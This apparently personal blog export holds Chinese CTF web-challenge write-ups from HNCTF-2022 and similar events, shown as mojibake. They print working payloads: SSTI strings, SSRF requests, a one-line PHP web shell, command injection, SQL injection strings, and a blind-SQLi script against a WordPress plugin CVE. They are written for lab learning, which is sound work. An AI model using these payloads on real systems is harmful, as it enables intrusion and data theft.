#\rç»™äº†ä¸€ä¸ªé“¾æ¥ç‚¹è¿›å»çœ‹çœ‹\nå¥½åƒæ˜¯è¦GETä¸€ä¸ªnameå‚æ•°\nè¯•è¯•çœ‹çœ‹\nç›´æ¥å¼€å§‹æ³¨å…¥\npayload:{{lipsum.__globals__.__getitem__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls\u0026#39;).read()}}\ræˆ–è€…\r{{url_for.__globals__.os.popen(\u0026#39;ls\u0026#39;).read()}} æ²¡è¿‡æ»¤ä»€ä¹ˆä¸œè¥¿ï¼Œæœ‰å¾ˆå¤šè¯­å¥éƒ½èƒ½æ³¨å…¥\nez_ssrf #\rè¿›å»æ˜¯ä¸‹é¢è¿™ä¸ªç•Œé¢\né¢˜ç›®æç¤ºè®¿é—®index.php\nå¦‚ä¸‹\n\u0026lt;?php\rhighlight_file(__FILE__);\rerror_reporting(0);\r$data=base64_decode($_GET[\u0026#39;data\u0026#39;]);\r$host=$_GET[\u0026#39;host\u0026#39;];\r$port=$_GET[\u0026#39;port\u0026#39;];\r$fp=fsockopen($host,intval($port),$error,$errstr,30);\rif(!$fp) {\rdie();\r}\relse {\rfwrite($fp,$data);\rwhile(!feof($data))\r{\recho fgets($fp,128);\r}\rfclose($fp);\r} è¯¥ä»£ç çš„ä½œç”¨æ˜¯é€šè¿‡å°†ä¼ é€’çš„å‚æ•°$dataè¿›è¡Œbase64è§£ç åï¼Œå°†æ•°æ®å‘é€åˆ°æŒ‡å®šçš„ä¸»æœº$hostå’Œç«¯å£$portï¼Œå¹¶è¯»å–å“åº”æ•°æ®ã€‚è¿™é‡Œå¹¶æ²¡æœ‰åšä»»ä½•çš„è¿‡æ»¤ã€‚\nç›´æ¥ä¼ªé€ hostä¸º127.0.0.1\nportä¸º80ï¼Œå› ä¸ºhttpé»˜è®¤ä¸º80ç«¯å£\né‚£ä¹ˆå¯¹äºdataçš„å†…å®¹å°±è¦å¤æ‚ç‚¹äº†\n\u0026lt;?php\r$out = \u0026#34;GET /flag.php HTTP/1.1\\r\\n\u0026#34;;\r$out .= \u0026#34;Host: 127.0.0.1\\r\\n\u0026#34;;\r$out .= \u0026#34;Connection: Close\\r\\n\\r\\n\u0026#34;;\recho base64_encode($out);\r?\u0026gt; è¿™é‡Œæ¬è¿ä¸€ä¸‹åˆ«äººçš„ä»£ç â†‘\nè¿™ä¸ªdataä¼ªé€ äº†ä¸€ä¸ªhttpè¯·æ±‚\npayloadï¼šindex.php?host=127.0.0.1\u0026amp;port=80\u0026amp;data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo= easy_include #\r\u0026lt;?php\r//WEBæ‰‹è¦æ‡‚å¾—æœç´¢\rif(isset($_GET[\u0026#39;file\u0026#39;])){\r$file = $_GET[\u0026#39;file\u0026#39;];\rif(preg_match(\u0026#34;/php|flag|data|\\~|\\!|\\@|\\#|\\\\$|\\%|\\^|\\\u0026amp;|\\*|\\(|\\)|\\-|\\_|\\+|\\=/i\u0026#34;, $file)){\rdie(\u0026#34;error\u0026#34;);\r}\rinclude($file);\r}else{\rhighlight_file(__FILE__);\r} è¿™é‡Œæ¶‰åŠåˆ°äº†user-agentçš„æœ¨é©¬æ³¨å…¥\næ–‡ä»¶æ—¥å¿—é»˜è®¤åœ°å€ä¸º/var/log/nginx/access.log\nè®¿é—®ä¼šåœ¨æ—¥å¿—æ–‡ä»¶ä¸­ç•™ä¸‹UAå¤´é‡Œçš„ä¸œè¥¿ï¼ŒæŠ“ä¸ªåŒ…ï¼ŒæŠŠuaå¤´æ”¹ä¸ºä¸€å¥è¯æœ¨é©¬\nå†å°†æ—¥å¿—æ–‡ä»¶åŒ…å«ï¼Œå³å¯çˆ†å‡ºflag\nåŸç†ï¼šæ–‡ä»¶åŒ…å« includeèƒ½æ‰§è¡Œæ‹¬å·å†…çš„å‘½ä»¤ï¼Œæ‰€ä»¥åŒ…å«äº†æ—¥å¿—çš„æ—¶å€™ï¼Œæ‰§è¡Œäº†ä¸€å¥è¯æœ¨é©¬ã€‚\nCanyource #\r\u0026lt;?php\rhighlight_file(__FILE__);\rif(isset($_GET[\u0026#39;code\u0026#39;])\u0026amp;\u0026amp;!preg_match(\u0026#39;/url|show|high|na|info|dec|oct|pi|log|data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i\u0026#39;, $_GET[\u0026#39;code\u0026#39;])){\rif(\u0026#39;;\u0026#39; === preg_replace(\u0026#39;/[^\\W]+\\((?R)?\\)/\u0026#39;, \u0026#39;\u0026#39;, $_GET[\u0026#39;code\u0026#39;])) { eval($_GET[\u0026#39;code\u0026#39;]);}\relse\rdie(\u0026#39;nonono\u0026#39;);}\relse\recho(\u0026#39;please input code\u0026#39;);\r?\u0026gt; \\w çš„é‡Šä¹‰ä¸€èˆ¬éƒ½æ˜¯æŒ‡åŒ…å«å¤§å°å†™å­—æ¯æ•°å­—å’Œä¸‹åˆ’çº¿\nR æ˜¯æ­£åˆ™çš„é€’å½’æ¨¡å¼\nè¿™ä¸ªæ­£åˆ™æ›¿æ¢å°±æ˜¯æŠŠ â€å‡½æ•°åï¼ˆå‡½æ•°å†…å®¹ï¼‰â€œ æ›¿æ¢æˆç©ºï¼Œç›´åˆ°æœ€ååªå‰©ä¸€ä¸ªåˆ†å·\nè¿™ç§æƒ…å†µå°±åªæœ‰ç”¨phpå‡½æ•°æ¥è¯»å–æ–‡ä»¶äº†\npayloadï¼šprint_r(scandir(current(localeconv()))); å¯ä»¥æ‰«å‡ºå½“å‰ç›®å½•çš„æ–‡ä»¶\nçœ‹åˆ°flagåœ¨ç¬¬ä¸‰ä¸ªï¼Œé‚£å°±åè½¬ä¸€ä¸‹ï¼Œå†nextæŒ‡å‘ç¬¬äºŒä¸ªå°±è¡Œäº†\nä½†æ˜¯highå’Œshowè¢«æ£€æµ‹åˆ°äº†ï¼Œé‚£ä¹ˆå°±ä¸èƒ½ä½¿ç”¨highlight_fileå’Œshow_sourceå‡½æ•°äº†\nå¾—æƒ³æƒ³å…¶ä»–åŠæ³•\nphpä¸­æœ‰ä¸€ä¸ªå‡½æ•°æ˜¯ readfile()\nç”¨æ¥è¯»å–æ–‡ä»¶çš„ï¼Œè¿™é‡Œåˆšå¥½æ²¡æœ‰è¿‡æ»¤\næ„é€ å¦‚ä¸‹\npayloadï¼›readfile(next(array_reverse(scandir(current(localeconv()))))); easy_unser #\rä¸€é“ååºåˆ—åŒ–çš„é¢˜\nä»£ç çœŸçš„é•¿ã€‚ã€‚ã€‚ã€‚èŠ±é‡Œèƒ¡å“¨çš„\nå…ˆå®¡è®¡ä¸€ä¸‹ä»£ç å§ã€‚\nä¸‹é¢é‚£ä¸ªç±»æ²¡ä»€ä¹ˆç”¨\nå…³é”®æ˜¯ä¸Šé¢é‚£ä¸ªç±»çš„wantï¼Œæˆ‘ä»¬è¦å°†å…¶highlight_file\nè¦è¦æ³¨æ„ç»•è¿‡wakeå‡½æ•°ï¼ŒæŠŠåºåˆ—åŒ–çš„å±æ€§åŠ 1å°±è¡Œ\nå¥½åƒæ˜¯php7ä»¥åå¯¹publicå’Œprivateä¸æ•æ„Ÿ\nè¿™é“é¢˜æ— æ³•ä½¿ç”¨public\n\u0026lt;?php\rclass body{\rpublic $want=\u0026#39;php://filter/resource=f14g.php\u0026#39;;\rpublic $todonothing=\u0026#39;123\u0026#39;;\r}\r$a=new body;\recho serialize($a);\r?\u0026gt; æˆ‘çš„phpä»£ç æ˜¯è¿™æ ·çš„ï¼Œä¸è¿‡çœ‹åˆ°ä¸€äº›wpä¸ŠæŠŠåºåˆ—å­—ç¬¦ä¸²è¿›è¡Œäº†urlencodeï¼Œè¿™é‡Œä¸åŠ å¯†ä¹Ÿèƒ½æ‰§è¡Œ\nè¦æ³¨æ„çš„æ˜¯ç”Ÿæˆçš„å­—ç¬¦ä¸²å¦‚ä¸‹\nO:4:\u0026#34;body\u0026#34;:2:{s:10:\u0026#34; body want\u0026#34;;s:30:\u0026#34;php://filter/resource=f14g.php\u0026#34;;s:17:\u0026#34; body todonothing\u0026#34;;s:3:\u0026#34;123\u0026#34;;} ç”±äºå˜é‡çš„å±æ€§æ˜¯privateï¼Œåœ¨nameé‡Œä¼šæœ‰ç‰¹æ®Šå­—ç¬¦ä¸å¯è§ï¼Œåº”è¯¥å°†å…¶ä¿®æ”¹ä¸º%00\næ‰èƒ½ç”Ÿæ•ˆ\næœ€åè®°å¾—æŠŠå±æ€§ä¸ªæ•°åŠ ä¸€\næœ€ç»ˆpayloadï¼š?ywant=O:4:\u0026#34;body\u0026#34;:3:{s:10:\u0026#34;%00body%00want\u0026#34;;s:30:\u0026#34;php://filter/resource=f14g.php\u0026#34;;s:17:\u0026#34;%00body%00todonothing\u0026#34;;s:3:\u0026#34;123\u0026#34;;} easy_sql #\rsqlé¢˜æ¥å’¯ï¼\néšä¾¿æµ‹è¯•ä¸€ä¸‹ï¼Œå‘ç°æ˜¯å­—ç¬¦å‹æ³¨å…¥\nè€Œä¸”ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œç”¨/**/ç»•è¿‡\nandå±…ç„¶ä¹Ÿè¢«è¿‡æ»¤äº†\nåªèƒ½ä¸€ä¸ªä¸€ä¸ªè¯•äº†ï¼Œå‘ç°æœ‰ä¸‰åˆ—ã€‚\n0\u0026#39;union/**/select/**/1,2,database()/**/where/**/\u0026#39;1 ç»§ç»­çˆ†ç ´\ninformation_schemaä¹Ÿè¢«è¿‡æ»¤äº†ã€‚ã€‚ã€‚\nè¿˜å¥½æˆ‘ç•™äº†å‡ ä¸ªåŠŸèƒ½å·®ä¸å¤šçš„\nsys.schema_table_statistic_with_buffer (åˆ—åä¸information_schemaä¸€æ ·)\rsys.x$ps_schema_table_statistics_io\rmysql.innodb_table_stats ç”¨ç¬¬ä¸‰ä¸ªå§ï¼Œå­—æ•°å°‘ä¸€äº›ã€‚\næ„é€ å¦‚ä¸‹\n0\u0026#39;union/**/select/**/1,2,group_concat(database_name)/**/from/**/mysql.innodb_table_stats/**/where/**/\u0026#39;1 ä¸ºä»€ä¹ˆä¼šæœ‰ä¸‰ä¸ªä¸€æ ·çš„åº“ï¼Ÿ\næŸ¥äº†ä¸€ä¸‹èµ„æ–™innodbæ— æ³•æŸ¥åˆ—å\nå®åœ¨æ˜¯å¼„ä¸æ˜ç™½ï¼Œä¸Šç­”æ¡ˆ\n0\u0026#39;union/**/select/**/1,2,group_concat(`1`)/**/from/**/(select/**/1/**/union/**/select/**/*/**/from/**/ctftraining.flag)a/**/where/**/\u0026#39;1 çœ‹äº†ä¸€ä¼šæœ‰äº›æ€è·¯\nwpé‡Œçš„åå¼•å·æ‹¬èµ·æ¥çš„1æ˜¯æŒ‡çš„è¡¨ä¸­åå­—ä¸ºâ€˜1â€™çš„é‚£ä¸€åˆ—\næ‹¬å·é‡Œçš„æ˜¯1è”åˆæŸ¥è¯¢ctftraining.flagé‡Œçš„æ‰€æœ‰åˆ—ï¼Œå¹¶å‘½åä¸ºa\nflagæœ‰å¯èƒ½ä¸åœ¨ç¬¬ä¸€åˆ—ä¸­ï¼Œæ‰€ä»¥ç”¨é€šé…ç¬¦*è¿›è¡ŒåŒ¹é…\nç„¶åå’Œ selectçš„1ç»„åˆèµ·æ¥å½¢æˆä¸€åˆ—\nå¤´éƒ½å¿«ç‚¸äº†ã€‚ã€‚ã€‚\nohmywordpress #\ræ²¡å•¥æ€è·¯ï¼Œä¸Šç½‘æœæœ\nå‘ç° CVE-2022-0760\næ˜¯ä¸€ä¸ªæ—¶é—´ç›²æ³¨çš„é¢˜\nç›´æ¥ä¸Šè„šæœ¬\nimport requests\rimport time\r# è¿™é‡Œæˆ‘ä»¬ç›´æ¥çŒœæµ‹flagå’Œä¸Šä¸€ä¸ªsqlæ³¨å…¥çš„flagä½ç½®ç›¸åŒ\r# flag\r# ctftraining.flag\rurl = \u0026#34;http://node2.anna.nssctf.cn:28433/wp-admin/admin-ajax.php\u0026#34;\rdict=\u0026#34;NSSCTF{_-abcdefghijklmnopqrstuvwxyz0123456789}~\u0026#34;\rdef get_values():\rcount = 8\rflag = \u0026#39;\u0026#39;\rwhile True:\rfor i in dict:\rdata = {\r\u0026#34;action\u0026#34;: \u0026#34;qcopd_upvote_action\u0026#34;,\r\u0026#34;post_id\u0026#34;: f\u0026#34;(SELECT 3 FROM (SELECT if(ascii(substr((select group_concat(flag) from ctftraining.flag),{count},1))={ord(i)}, sleep(2),0))enz)\u0026#34;\r}\rprint(i)\rstart_time = time.time()\rresp = requests.post(url=url, data=data)\rend_time = time.time()\rif end_time-start_time\u0026gt;=1.5:\rflag += i\rprint(flag)\rcount += 1\rbreak\relif i == \u0026#34;~\u0026#34;:\rreturn False\rtime.sleep(0.05)\rget_values() week3 #\rssssti #\ré€šè¿‡nameä¼ å‚\nä¸è¿‡è¿™é“é¢˜è¿‡æ»¤äº†ä¸€äº›ä¸œè¥¿\næˆ‘æ¯”è¾ƒå–œæ¬¢çš„ä¸€ä¸ªpayloadï¼š\n{{lipsum.__globals__.__getitem__(\u0026#39;os\u0026#39;).popen(\u0026#39;ls\u0026#39;).read()}} ä½†æ˜¯è¢«æ£€æµ‹åˆ°äº†\né‚£æƒ³æƒ³æ€ä¹ˆç»•è¿‡\n{{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}\u0026amp;a=__globals__\u0026amp;b=os\u0026amp;c=ls é€šè¿‡å¼•å…¥å‚æ•°æ˜¯å¯ä»¥çš„\nçœ‹çœ‹åˆ«äººçš„wp\n?name={{config[request.values.a][request.values.b][request.values.c][request.values.d].popen(request.values.f).read()}}\u0026amp;a=class\u0026amp;b=init\u0026amp;c=globals\u0026amp;d=os\u0026amp;f=cat flag æˆ–è€…\n?name={{(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read()}}\u0026amp;a=globals\u0026amp;b=os\u0026amp;c=cat /flag æ–¹æ³•å¾ˆå¤šã€‚\nFun_php #\rå®¡è®¡ä»£ç \n\u0026lt;?php\rerror_reporting(0);\rhighlight_file(__FILE__);\rinclude \u0026#34;k1y.php\u0026#34;;\rinclude \u0026#34;fl4g.php\u0026#34;;\r$week_1 = false;\r$week_2 = false;\r$getUserID = @$_GET[\u0026#39;user\u0026#39;]; $getpass = (int)@$_GET[\u0026#39;pass\u0026#39;]; $getmySaid = @$_GET[\u0026#39;mySaid\u0026#39;]; $getmyHeart = @$_GET[\u0026#39;myHeart\u0026#39;]; $data = @$_POST[\u0026#39;data\u0026#39;];\r$verify =@$_POST[\u0026#39;verify\u0026#39;];\r$want = @$_POST[\u0026#39;want\u0026#39;];\r$final = @$_POST[\u0026#39;final\u0026#39;];\rif(\u0026#34;Welcom\u0026#34;==0\u0026amp;\u0026amp;\u0026#34;T0\u0026#34;==0\u0026amp;\u0026amp;\u0026#34;1he\u0026#34;==1\u0026amp;\u0026amp;\u0026#34;HNCTF2022\u0026#34;==0)\recho \u0026#34;Welcom T0 1he HNCTF2022\u0026lt;BR\u0026gt;\u0026#34;;\rif(\u0026#34;state_HNCTF2022\u0026#34; == 1) echo $hint;\relse echo \u0026#34;HINT? NoWay~!\u0026lt;BR\u0026gt;\u0026#34;;\rif(is_string($getUserID))\r$user = $user + $getUserID; //u5er_D0_n0t_b3g1n_with_4_numb3r\rif($user == 114514 \u0026amp;\u0026amp; $getpass == $pass){\rif (!ctype_alpha($getmySaid)) die();\rif (!is_numeric($getmyHeart)) die();\rif(md5($getmySaid) != md5($getmyHeart)){\rdie(\u0026#34;Cheater!\u0026#34;);\r}\relse\r$week_1 = true;\r}\rif(is_array($data)){\rfor($i=0;$i\u0026lt;count($data);$i++){\rif($data[$i]===\u0026#34;Probius\u0026#34;) exit();\r$data[$i]=intval($data[$i]);\r}\rif(array_search(\u0026#34;Probius\u0026#34;,$data)===0)\r$week_2 = true;\relse\rdie(\u0026#34;HACK!\u0026#34;);\r}\rif($week_1 \u0026amp;\u0026amp; $week_2){\rif(md5($data)===md5($verify))\r// â€®â¦HNCTFâ©â¦Welcome to\rif (\u0026#34;hn\u0026#34; == $_GET[\u0026#39;hn\u0026#39;] \u0026amp;â€®â¦+!!â©â¦\u0026amp; \u0026#34;â€®â¦ Flag!â©â¦ctf\u0026#34; == $_GET[â€®â¦LAGâ©â¦ctf]) { //HN! flag!! F\rif(preg_match(\u0026#34;/php|\\fl4g|\\\\$|\u0026#39;|\\\u0026#34;/i\u0026#34;,$want)Or is_file($want))\rdie(\u0026#34;HACK!\u0026#34;);\relse{\recho \u0026#34;Fine!you win\u0026#34;;\rsystem(\u0026#34;cat ./$want\u0026#34;);\r}\r}\relse\rdie(\u0026#34;HACK!\u0026#34;);\r} æ€è·¯è¿˜æ˜¯æ¯”è¾ƒæ¸…æ™°çš„\né¦–å…ˆuserè¦ç­‰äº114514ï¼Œè€Œä¸”è¿˜è¦æ˜¯å­—ç¬¦ä¸²ï¼Œå¹¸å¥½æ˜¯å¼±æ¯”è¾ƒ\nç›´æ¥user=114514aå³å¯\nç„¶åä¸‹é¢æ˜¯ä¸€ä¸ªmd5çš„å¼±æ¯”è¾ƒï¼Œè¦æ±‚ä¸€ä¸ªçº¯å­—æ¯ä¸€ä¸ªçº¯æ•°å­—ï¼Œå°è±¡ä¸­åˆšå¥½æœ‰ä¸¤ä¸ªè¿™æ ·çš„å­—ç¬¦ä¸²\nmySaid=QNKCDZO\u0026amp;myHeart=240610708 week1å˜ä¸ºtrueï¼Œç°åœ¨å°±å·®week2äº†ï¼Œçœ‹çœ‹ä¸‹é¢é‚£éƒ¨åˆ†\ndataè¦æ˜¯æ•°ç»„ï¼Œdata[]=0å°±å¯ä»¥äº†\nMD5æ¯”è¾ƒï¼Œverify[]=1ç»•è¿‡\nå› ä¸ºmd5ä¸èƒ½åŠ å¯†æ•°ç»„ï¼ŒåŠ å¯†ä¼šè¿”å›null\nè¿™é‡Œæœ‰ç‚¹å¥‡æ€ªï¼Œåé¢é‚£ä¸ªflagæ€ä¹ˆé¢œè‰²ä¸ä¸€æ ·ï¼Ÿ\næƒ³èµ·æ¥ä¹‹å‰åšè¿‡ä¸€é“é¢˜ï¼Œå‡ºé¢˜äººåœ¨phpä»£ç é‡ŒåŠ äº†ä¸€äº›ä¸å¯è§å­—ç¬¦\nè¯•è¯•æŠŠæºç æ”¾åˆ°phpstormä¸Šè¯•è¯•\næœç„¶æ˜¯è¿™æ ·ï¼ï¼ï¼\nå°†å…¶å¤åˆ¶åˆ°ç¼–ç ç½‘ç«™ï¼Œç”¨urlencodeä¸€ä¸‹åœ¨è¿›è¡Œä¼ å‚\næˆ‘ç”¨çš„hackbaræ¯æ¬¡éƒ½ä¸è¡Œä¸çŸ¥é“ä¸ºä»€ä¹ˆ\nåœ¨æºç é‡Œæ‹¿åˆ°flag\nez_phar #\ræ²¡æœ‰ç›´æ¥ååºåˆ—åŒ–çš„ç‚¹\né¢˜ç›®ä¹Ÿè®©ä¸Šä¼ ä¸œè¥¿ï¼Œé‚£ä¹ˆåº”è¯¥æ˜¯pharååºåˆ—åŒ–çš„çŸ¥è¯†\nå‘ç°æœ‰upload.php\nåº”è¯¥æ˜¯ä»è¿™é‡Œä¸Šä¼ pharæ–‡ä»¶\nä¸€ä¸ªåŸºæœ¬çš„ç”Ÿæˆpharæ–‡ä»¶çš„æ¨¡æ¿ğŸ‘‡\n\u0026lt;?php\rclass Flag{\rpublic $code = \u0026#34;system(\u0026#39;cat /ffflllaaaggg\u0026#39;);\u0026#34;; //system(\u0026#39;ls /\u0026#39;);\r}\r$a = new Flag();\r$phar = new phar(\u0026#39;b.phar\u0026#39;);//å¯¹pharå¯¹è±¡è¿›è¡Œå®ä¾‹åŒ–ï¼Œä»¥ä¾¿åç»­æ“ä½œã€‚\r$phar -\u0026gt; startBuffering();//ç¼“å†²pharå†™æ“ä½œï¼ˆä¸ç”¨ç‰¹åˆ«æ³¨æ„ï¼‰\r$phar -\u0026gt; setStub(\u0026#34;\u0026lt;?php __HALT_COMPILER(); ?\u0026gt;\u0026#34;);//è®¾ç½®stubï¼Œä¸ºå›ºå®šæ ¼å¼\r$phar -\u0026gt; setMetadata($a);//æŠŠæˆ‘ä»¬çš„å¯¹è±¡å†™è¿›Metadataä¸­\r$phar -\u0026gt; addFromString(\u0026#34;test.txt\u0026#34;,\u0026#34;helloworld!!\u0026#34;);//å†™å‹ç¼©æ–‡ä»¶çš„å†…å®¹ï¼Œè¿™é‡Œæ²¡åˆ©ç”¨ç‚¹ï¼Œå¯ä»¥éšä¾¿å†™\r$phar -\u0026gt; stopBuffering();//åœæ­¢ç¼“å†²\r?\u0026gt;\r","date":"2023-06-17","externalUrl":null,"permalink":"/posts/2023/06/hnctf-2022/","section":"Posts","summary":"","title":"HNCTF-2022","type":"posts"},{"content":"\ræˆ‘flagå‘¢ï¼Ÿ #\rè¿›å»ä¹‹åé¡µé¢æ˜¯è¿™æ ·\nå…ˆçœ‹çœ‹ç½‘é¡µæºç å‘¢\nåœ¨æ³¨é‡Šé‡Œæ‹¿åˆ°flag\næºç é‡Œä¹Ÿæœ‰ä¸€æ®µå½©è›‹\nå¯¼å¼¹è¿·è¸ª #\rè¿›å»ä¹‹åå¥½åƒæ˜¯ä¸€ä¸ªå°æ¸¸æˆ\nå…ˆå®¡æŸ¥ä¸€ä¸‹æºç \nåœ¨æœ€ä¸‹é¢çœ‹åˆ°Game files\næŸ¥çœ‹ä¸€ä¸‹game.js\nå‘ç°flag\nFollow me and hack me #\ræ²¡å•¥éš¾åº¦\nç›´æ¥ä¸Šhackbarå°±è¡Œ\nä¼¼ä¹å¤‡ä»½æ–‡ä»¶é‡Œæœ‰ä»€ä¹ˆä¸œè¥¿ï¼Œå»çœ‹çœ‹\nè¯•è¯•å¸¸ç”¨çš„å¤‡ä»½æ–‡ä»¶\nå‘ç°æœ‰/www.zipï¼Œåœ¨index.php.baké‡Œå‘ç°ä¸€ä¸ªå½©è›‹\nVim yyds #\råªçŸ¥é“VIMæ˜¯ä¸ªç¼–è¾‘å™¨ï¼Œç„¶åå»æŸ¥äº†ä¸€ä¸‹ä¿¡æ¯\nvimç¼–è¾‘çš„index.phpæ–‡ä»¶ï¼Œåœ¨ç¼–è¾‘çŠ¶æ€å¼ºåˆ¶é€€å‡ºç»ˆç«¯ï¼Œä¼šåœ¨åŒç›®å½•ä¸‹äº§ç”Ÿä¸€ä¸ª.index.php.swpæ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨vim -r .index.php.swpæ¢å¤æ–‡ä»¶\n\u0026lt;?php\rerror_reporting(0);\r$password = \u0026#34;Give_Me_Your_Flag\u0026#34;;\recho \u0026#34;\u0026lt;p\u0026gt;can can need Vim \u0026lt;/p\u0026gt;\u0026#34;;\rif ($_POST[\u0026#39;password\u0026#39;] === base64_encode($password)) {\recho \u0026#34;\u0026lt;p\u0026gt;Oh You got my password!\u0026lt;/p\u0026gt;\u0026#34;;\reval(system($_POST[\u0026#39;cmd\u0026#39;]));\r}\r?\u0026gt; POSTä¸€ä¸ªbase64åŠ å¯†åçš„passwordï¼Œå†POSTä¸€ä¸ªcmdæ‰§è¡Œå‘½ä»¤å°±è¡Œ\nPHPæ˜¯ä¸–ç•Œä¸Šæœ€å¥½çš„è¯­è¨€ï¼ï¼ #\rè¿›å»ä¹‹åå¥½åƒæ˜¯ä¸€ä¸ªè½¬åŒ–å·¥å…·\nçŒœæµ‹æœ‰å¯èƒ½æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œåœ¨å³è¾¹éšä¾¿è¯•è¯•ï¼Œ\nrunä¸€ä¸‹system(\u0026ldquo;ls /\u0026rdquo;);ç›®å½•å°±çˆ†å‡ºæ¥äº†\nç„¶åç›´æ¥cat flagå°±è¡Œ\nè¿™é“é¢˜ä¼¼ä¹æ²¡æœ‰è¿‡æ»¤ä»€ä¹ˆä¸œè¥¿\nä½œä¸šç®¡ç†ç³»ç»Ÿ #\rè¿›å»å°±æ˜¯ä¸€ä¸ªç™»å½•ï¼Œè¯•è¯•ç”¨adminï¼Œadminç™»å½•ï¼Œè¿›å»ä¹‹åå¦‚ä¸‹\nä¸‹é¢æœ‰ä¸ªåˆ›å»ºæ–‡ä»¶ï¼Œéšä¾¿åˆ›å»ºä¸€ä¸ª1.phpï¼Œç„¶åç¼–è¾‘ä¸€ä¸‹\n\u0026lt;?php @eval($_POST[\u0026#39;hyh\u0026#39;]);?\u0026gt; ç„¶åèšå‰‘è¿èµ·æ¥\nåœ¨æ ¹ç›®å½•ä¸‹æ‹¿åˆ°flag\nPing #\rç®€å•çš„å‰ç«¯ç»•è¿‡ï¼ŒæŠŠcheck_ipåˆ äº†å°±è¡Œ\nç„¶åç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œå°±å°±è¡Œ\n127.0.0.1|ls / =\u0026gt; 127.0.0.1|cat /flag æ‹¿åˆ°flag\nè¿™æ˜¯ä»€ä¹ˆï¼ŸSQL ï¼æ³¨ä¸€ä¸‹ ï¼ #\ræç¤ºå¦‚ä¸‹ï¼Œå±…ç„¶å¥—è¿™ä¹ˆå¤šå±‚ã€‚ã€‚ã€‚ã€‚\nå…ˆè¿›è¡Œå¸¸è§„æ³¨å…¥ï¼Œå†passwordé‡Œå‘ç°ä¸€æ®µå½©è›‹\nå¥½åƒflagå°±ä¸åœ¨è¿™ä¸ªæ•°æ®åº“é‡Œé¢\né‚£å°±é‡æ–°æ¥è¿‡\nçˆ†ä¸€ä¸‹åº“åï¼š\n-1)))))) and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata--+ è¿˜æœ‰ä¸€ä¸ªctftrainingåº“ï¼Œflagåº”è¯¥æ˜¯åœ¨è¿™ä¸ªåº“é‡Œé¢\né‡Œé¢ä¹Ÿæœ‰ä¸€å¼ flagè¡¨ï¼Œè¿™ä¸ªæ—¶å€™è¦æ‹¿åˆ°flagå­—æ®µçš„æ—¶å€™å°±è¦æŒ‡æ˜æ•°æ®åº“äº†ï¼Œä¸ç„¶ä»–åªä¼šæŸ¥é»˜è®¤é‚£ä¸ªåº“\næ‹¿åˆ°flagï¼š\n-1)))))) and 1=2 union select 1,group_concat(flag) from ctftraining.flag--+ Http pro max plus #\rè¿™é“é¢˜è€ƒçš„æ˜¯å’ŒHTTPç›¸å…³çš„\nç›´æ¥ä¸Šburpsuite\nè¯•è¯•X-Forwarded-Forå¤´ï¼Œç»“æœè¢«å‘ç°äº†ï¼\nç„¶åå†è¯•è¯•Client-Ipï¼š127.0.0.1\næ¥åˆ°ä¸‹ä¸€å…³\nä½œè€…ä¸ºä»€ä¹ˆè¦é€‰è¿™ä¸ªç½‘ç«™ã€‚ã€‚ã€‚ã€‚\nçœ‹è§fromå°±æƒ³åˆ°refereräº†ï¼Œæ·»åŠ ä¸€ä¸ªrefererå¤´ç»•è¿‡\næ¥åˆ°ä¸‹ä¸€å…³\nuser-agentï¼šChrome\nä¸‹ä¸€å…³\nå“¦ï¼Ÿè¿™æ˜¯æ–°ä¸œè¥¿ï¼Œæ²¡è§è¿‡ï¼Œåˆ°å¤„æŸ¥èµ„æ–™ï¼Œå¹¸å¥½æœ‰ä¸‡èƒ½çš„GPT\næ·»åŠ ä¸€ä¸ªVia å¤´\nå‡ºç°ä¸€ä¸ªphpï¼Œè¿›å»çœ‹çœ‹\nå‘ç°æºç \nåœ¨å¦ä¸€ä¸ªphpä¸­å¾—åˆ°flag\nå°±å½“æ— äº‹å‘ç”Ÿ #\råœ¨GitHubæºç é‡Œï¼Œæ‹¿åˆ°flag\n1zjs #\rä¸€ä¸ªé­”æ–¹æ¸¸æˆï¼Œæˆ‘ä¸ä¼šç©é­”æ–¹ã€‚ã€‚\nä¸‡äº‹å…ˆçœ‹çœ‹æºç \nåœ¨ä¸€ä¸ªjsæ–‡ä»¶é‡Œå‘ç°flag.php\nè¿›å»çœ‹çœ‹ï¼Œå…¨æ˜¯æ‹¬å·\nä¸è¿‡è¿™é“é¢˜å«jsï¼Œåº”è¯¥æ˜¯ä¸jsæœ‰å…³ï¼Œä½†æ˜¯çœ‹ç€å¥½åƒåˆä¸æ˜¯jsä»£ç ï¼Œ æŸ¥è¯¢èµ„æ–™åå‘ç°æ˜¯ jsfuckç±»å‹çš„ä»£ç \nç›´æ¥å»è§£ç æˆ–è€…åœ¨æ§åˆ¶å°è·‘ä¸€ä¸‹å°±è¡Œäº†\nFlagç‚¹å‡»å°±é€ï¼ #\réšä¾¿è¾“å…¥ä¸€ä¸ªåå­—ï¼Œå‘ç°å“åº”å¤´é‡Œæœ‰session\næŠŠè¿™æ®µsessionæ‹¿å»jwt.ioè§£å¯†ä¸€ä¸‹\né‚£ä¹ˆå°±è¦ä¼ªé€ sessionäº†\nåœ¨ä¼ªé€ sessionä¹‹å‰è¦çŸ¥é“keyå€¼\nflaskæ¡†æ¶çš„sessionæ˜¯å­˜å‚¨åœ¨å®¢æˆ·ç«¯çš„ï¼Œé‚£ä¹ˆå°±éœ€è¦è§£å†³sessionæ˜¯å¦ä¼šè¢«æ¶æ„çº‚æ”¹çš„é—®é¢˜ï¼Œè€Œflaské€šè¿‡ä¸€ä¸ªsecret_keyï¼Œä¹Ÿå°±æ˜¯å¯†é’¥å¯¹æ•°æ®è¿›è¡Œç­¾åæ¥é˜²æ­¢sessionè¢«çº‚æ”¹ã€‚\nä½¿ç”¨è„šæœ¬åŠ å¯†ä¸€ä¸‹\npython flask_session_cookie_manager3.py encode -s \u0026#39;LitCTF\u0026#39; -t \u0026#39;{\u0026#34;name\u0026#34;:\u0026#34;admin\u0026#34;}\u0026#39; 